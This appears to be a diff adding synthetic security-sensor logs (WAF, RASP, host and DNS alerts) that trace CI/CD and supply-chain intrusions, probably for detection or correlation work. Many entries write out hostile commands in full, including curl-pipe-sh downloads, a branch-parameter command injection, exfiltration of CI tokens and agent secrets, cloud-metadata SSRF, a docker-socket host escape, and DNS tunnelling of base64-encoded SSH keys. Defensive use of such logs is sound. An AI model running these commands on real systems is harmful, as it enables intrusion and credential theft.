@@ -1,0 +1,165 @@
+1. `2026-07-09 02:52:45` **[waf]** `WAF0459739`
+    `/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6`
+2. `2026-07-09 02:52:46` **[web]** `WEB0462729`
+    `/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6`
+3. `2026-07-09 02:52:48` **[rasp]** `RASP0508665`
+    `https://app-node-41.ops-corp.com/api/v2/pipeline/run {"npm_lifecycle": "postinstall", "spawn": "sh -c"} Mozill`
+4. `2026-07-09 02:53:46` **[hids]** `HID0498234`
+    `curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm`
+
+1. `2026-07-10 22:39:16` **[waf]** `WAF0472361`
+    `/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro`
+2. `2026-07-10 22:39:18` **[web]** `WEB0475433`
+    `/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro`
+3. `2026-07-10 22:39:19` **[rasp]** `RASP0522631`
+    `https://app-django-88.ops-corp.com/api/v2/packages/install {"build_step": "setup.py", "exec": "os.system"} Moz`
+4. `2026-07-10 22:40:47` **[hids]** `HID0511915`
+    `python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip`
+
+1. `2026-07-08 11:31:07` **[waf]** `WAF0455310`
+    `/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe`
+2. `2026-07-08 11:31:08` **[web]** `WEB0458271`
+    `/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe`
+3. `2026-07-08 11:31:10` **[rasp]** `RASP0503765`
+    `https://app-java-95.ops-corp.com/repository/maven-snapshots {"artifact": "build-tools.jar", "snapshot": "overw`
+4. `2026-07-08 11:33:08` **[hids]** `HID0493440`
+    `java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn`
+
+1. `2026-07-12 17:00:35` **[waf]** `WAF0484573`
+    `/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; `
+2. `2026-07-12 17:00:37` **[web]** `WEB0487725`
+    `/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; `
+3. `2026-07-12 17:00:38` **[rasp]** `RASP0536145`
+    `https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {"image": "runner-base:1.4.0", "entrypoint": "/bin/sh"}`
+4. `2026-07-12 17:01:36` **[hids]** `HID0525147`
+    `curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]`
+
+1. `2026-07-15 04:22:53` **[waf]** `WAF0501692`
+    `/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_`
+2. `2026-07-15 04:22:54` **[web]** `WEB0504955`
+    `/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_`
+3. `2026-07-15 04:22:56` **[rasp]** `RASP0555087`
+    `https://app-node-170.ops-corp.com/api/v1/build/trigger {"param_inject": "branch", "cmd": "curl|sh"} Mozilla/5.`
+4. `2026-07-15 04:23:54` **[hids]** `HID0543698`
+    `curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm`
+5. `2026-07-15 04:24:36` **[hids]** `HID0543701`
+    `curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node`
+
+1. `2026-07-15 12:36:45` **[waf]** `WAF0504065`
+    `/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh`
+2. `2026-07-15 12:36:47` **[web]** `WEB0507344`
+    `/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh`
+3. `2026-07-15 12:36:48` **[rasp]** `RASP0557713`
+    `https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {"workflow": "release.yml", "secrets": "GI`
+4. `2026-07-15 12:38:16` **[hids]** `HID0546272`
+    `curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker`
+5. `2026-07-15 12:39:20` **[hids]** `HID0546278`
+    `git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker`
+
+1. `2026-07-06 15:24:49` **[waf]** `WAF0442593`
+    `/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;`
+2. `2026-07-06 15:24:50` **[web]** `WEB0445472`
+    `/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;`
+3. `2026-07-06 15:24:52` **[rasp]** `RASP0489693`
+    `https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {"env_dump": "AWS_SECRET_ACCESS_KEY", "step": "after`
+4. `2026-07-06 15:26:50` **[hids]** `HID0479659`
+    `cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar`
+5. `2026-07-06 15:28:18` **[hids]** `HID0479667`
+    `curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar`
+
+1. `2026-07-22 09:47:02` **[waf]** `WAF0551690`
+    `/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S`
+2. `2026-07-22 09:47:04` **[web]** `WEB0555278`
+    `/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S`
+3. `2026-07-22 09:47:05` **[rasp]** `RASP0610409`
+    `https://app-java-65.ops-corp.com/api/v1/releases/upload {"artifact": "app-2.8.0.jar", "patched": "app/lib/"} M`
+4. `2026-07-22 09:49:03` **[hids]** `HID0597884`
+    `cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar s`
+5. `2026-07-22 13:13:03` **[dns]** `DNS0582261`
+    `238d9b26.kxqzrt-5a02.net A 192.0.2.70`
+6. `2026-07-22 13:13:47` **[dns]** `DNS0582265`
+    `87ec8219.kxqzrt-5a02.net A 10.10.29.163`
+7. `2026-07-22 13:15:13` **[dns]** `DNS0582272`
+    `e1bb49b5.kxqzrt-5a02.net A 10.10.34.233`
+
+1. `2026-07-10 02:55:13` **[waf]** `WAF0466671`
+    `/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+2. `2026-07-10 02:55:14` **[web]** `WEB0469706`
+    `/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+3. `2026-07-10 02:55:16` **[rasp]** `RASP0516335`
+    `https://app-nginx-51.ops-corp.com/api/webhook/gitlab {"webhook_ssrf": "169.254.169.254", "ref": "main"} Mozill`
+4. `2026-07-10 02:56:14` **[hids]** `HID0505746`
+    `curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process`
+5. `2026-07-10 04:44:14` **[dns]** `DNS0490550`
+    `7011ca84.glbwpt-3f7a.net A 198.51.100.51`
+6. `2026-07-10 04:44:47` **[dns]** `DNS0490553`
+    `0dfb2ffb.glbwpt-3f7a.net A 10.10.39.50`
+7. `2026-07-10 04:46:04` **[dns]** `DNS0490559`
+    `69e38046.glbwpt-3f7a.net A 10.10.30.206`
+
+1. `2026-07-30 02:16:50` **[waf]** `WAF0604886`
+    `/api/agent/tasks/run ?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa Mozilla/5.0 (Windows NT 11.0; `
+2. `2026-07-30 02:17:48` **[hids]** `HID0655526`
+    `tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www`
+
+1. `2026-07-30 06:30:23` **[waf]** `WAF0606105`
+    `/api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma`
+2. `2026-07-30 06:31:51` **[hids]** `HID0656849`
+    `curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa`
+
+1. `2026-07-23 20:25:50` **[waf]** `WAF0561679`
+    `/api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe`
+2. `2026-07-23 20:27:48` **[hids]** `HID0608709`
+    `sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local`
+
+1. `2026-07-10 19:59:40` **[rasp]** `RASP0521783`
+    `https://app-java-77.ops-corp.com/v2/ops-corp/api-gateway/blobs/uploads/ {"registry_push": "api-gateway:2.8.0",`
+2. `2026-07-10 20:00:38` **[hids]** `HID0511081`
+    `docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim`
+
+1. `2026-07-10 01:20:35` **[rasp]** `RASP0515832`
+    `https://app-django-190.ops-corp.com/api/v1/pip/config {"index_url": "10.20.5.77/simple", "tool": "pip"} Mozill`
+2. `2026-07-10 01:22:03` **[hids]** `HID0505256`
+    `pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip`
+
+1. `2026-07-13 23:03:39` **[rasp]** `RASP0545732`
+    `https://app-go-52.ops-corp.com/api/v1/runner/shell {"runner": "dind", "sock": "docker.sock"} Mozilla/5.0 (Wind`
+2. `2026-07-13 23:04:37` **[hids]** `HID0534536`
+    `docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd`
+3. `2026-07-13 23:05:24` **[hids]** `HID0534540`
+    `kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c `
+
+1. `2026-07-31 17:21:11` **[hids]** `HID0667730`
+    `tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener`
+
+1. `2026-07-01 19:44:46` **[hids]** `HID0443507`
+    `npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm`
+2. `2026-07-01 19:45:28` **[hids]** `HID0443511`
+    `curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm`
+
+1. `2026-07-05 19:50:51` **[hids]** `HID0473535`
+    `gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec r`
+2. `2026-07-05 19:52:19` **[hids]** `HID0473543`
+    `gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake`
+3. `2026-07-05 19:53:04` **[hids]** `HID0473547`
+    `git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem`
+
+1. `2026-07-21 23:43:29` **[hids]** `HID0594730`
+    `sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash`
+2. `2026-07-22 01:49:29` **[dns]** `DNS0578737`
+    `cc11fdda.wqnvhs-6d24.net A 198.51.100.136`
+3. `2026-07-22 01:49:57` **[dns]** `DNS0578739`
+    `76f957c1.wqnvhs-6d24.net A 10.10.24.44`
+4. `2026-07-22 01:50:58` **[dns]** `DNS0578745`
+    `86b8c742.wqnvhs-6d24.net A 10.10.24.94`
+
+1. `2026-07-22 11:37:52` **[hids]** `HID0598451`
+    `base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www`
+2. `2026-07-22 11:39:50` **[hids]** `HID0598461`
+    `for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <=`
+3. `2026-07-22 16:15:50` **[dns]** `DNS0583203`
+    `b2be53e9.rvnqzt-9b41.net A 10.10.43.60`
+4. `2026-07-22 16:16:24` **[dns]** `DNS0583206`
+    `e9d8cfdd.rvnqzt-9b41.net A 10.10.25.165`
+5. `2026-07-22 16:17:43` **[dns]** `DNS0583213`
+    `0e66506a.rvnqzt-9b41.net A 198.51.100.74`
